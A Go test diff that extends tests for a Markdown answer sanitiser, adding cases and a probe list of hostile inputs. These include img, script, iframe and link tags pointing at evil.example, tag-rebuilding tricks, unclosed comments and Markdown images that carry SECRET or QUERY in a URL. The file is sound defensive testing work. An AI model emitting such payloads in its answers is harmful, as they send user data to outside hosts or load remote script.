@@ -2,6 +2,7 @@ package fleet
 
 import (
 	"context"
+	"regexp"
 	"strings"
 	"testing"
 
@@ -23,8 +24,21 @@ func TestSanitiseAnswer(t *testing.T) {
 		{"comment dropped", "a<!-- hidden -->b", "ab"},
 		{"multiline tag dropped", "a<div\nclass=\"x\">b</div>", "ab"},
 		{"autolink kept", "see <https://example.org/x>", "see <https://example.org/x>"},
+		{"http autolink kept", "see <http://example.org/x>", "see <http://example.org/x>"},
+		{"other autolink escaped", "mail <mailto:a@example.org>", `mail \<mailto:a@example.org>`},
 		{"less-than kept", "1 < 2 and 3 > 2", "1 < 2 and 3 > 2"},
-		{"code span kept", "use `a<b`", "use `a<b`"},
+		{"less-than before a digit kept", "a<3", "a<3"},
+		{"less-than before a letter in code escaped", "use `a<b`", "use `a\\<b`"},
+		{"tag with a less-than in an attribute escaped", `<img src="https://evil.example/b?q=QUERY" alt="<">`, `\<img src="https://evil.example/b?q=QUERY" alt="<">`},
+		{"tag rebuilt by removal dropped", "<<b>img src=https://evil.example/n>", ""},
+		{"script with less-thans in attributes escaped", `<script src="https://evil.example/x.js" data-x="<"></script x="<">`, `\<script src="https://evil.example/x.js" data-x="<">\</script x="<">`},
+		{"iframe with a less-than in an attribute escaped", `<iframe src="https://evil.example/f" title="<"></iframe>`, `\<iframe src="https://evil.example/f" title="<">`},
+		{"link with a less-than in an attribute escaped", `<a href="https://evil.example/phish" title="<">click</a>`, `\<a href="https://evil.example/phish" title="<">click`},
+		{"unclosed comment escaped", "# Report\n\nThe answer is X.\n\n<!-- reviewer note", "# Report\n\nThe answer is X.\n\n\\<!-- reviewer note"},
+		{"unclosed script line escaped", "a\n<script\nb", "a\n\\<script\nb"},
+		{"processing instruction escaped", "<?php echo 1;", `\<?php echo 1;`},
+		{"escaped opener kept", `\<img src=x alt="<">`, `\<img src=x alt="<">`},
+		{"escaped backslash before an opener escaped", `\\<img src=x alt="<">`, `\\\<img src=x alt="<">`},
 		{"escaped bracket in alt", `![x\]](https://evil.example/b?d=SECRET)`, `[x\]](https://evil.example/b?d=SECRET)`},
 		{"nested brackets in alt", "![a [b] c](https://evil.example/b?d=SECRET)", "[a [b] c](https://evil.example/b?d=SECRET)"},
 		{"reference image", "![a][r]\n\n[r]: https://evil.example/b?d=SECRET", "[a][r]\n\n[r]: https://evil.example/b?d=SECRET"},
@@ -39,6 +53,36 @@ func TestSanitiseAnswer(t *testing.T) {
 				t.Errorf("sanitiseAnswer(%q) = %q, want %q", tt.in, got, tt.want)
 			}
 		})
+	}
+}
+
+// rawHTMLProbes are answers that carry live raw HTML past single-pass tag
+// removal, or open an HTML block that swallows the rest of the document.
+var rawHTMLProbes = []string{
+	`<img src="https://evil.example/b?q=QUERY" alt="<">`,
+	"<<b>img src=https://evil.example/n>",
+	`<script src="https://evil.example/x.js" data-x="<"></script x="<">`,
+	`<iframe src="https://evil.example/f" title="<"></iframe>`,
+	`<a href="https://evil.example/phish" title="<">click</a>`,
+	"# Report\n\nThe answer is X.\n\n<!-- reviewer note",
+	"# Report\n\n<script\nThe answer is X.",
+}
+
+// unescapedHTMLOpener matches a "<" that could open raw HTML with no
+// backslash before it. The probes carry no backslash of their own, so one
+// before a "<" is always the sanitiser's escape.
+var unescapedHTMLOpener = regexp.MustCompile(`(^|[^\\])<[A-Za-z/!?]`)
+
+// TestSanitiseAnswerLeavesNoRawHTMLOpener: whatever tag removal misses, no
+// "<" that could open raw HTML survives unescaped, alone or appended to
+// ordinary Markdown.
+func TestSanitiseAnswerLeavesNoRawHTMLOpener(t *testing.T) {
+	for _, probe := range rawHTMLProbes {
+		for _, in := range []string{probe, "# Report\n\nBody text.\n\n" + probe + "\n\nMore text."} {
+			if got := sanitiseAnswer(in); unescapedHTMLOpener.MatchString(got) {
+				t.Errorf("sanitiseAnswer(%q) = %q, which keeps an unescaped raw-HTML opener", in, got)
+			}
+		}
 	}
 }
 
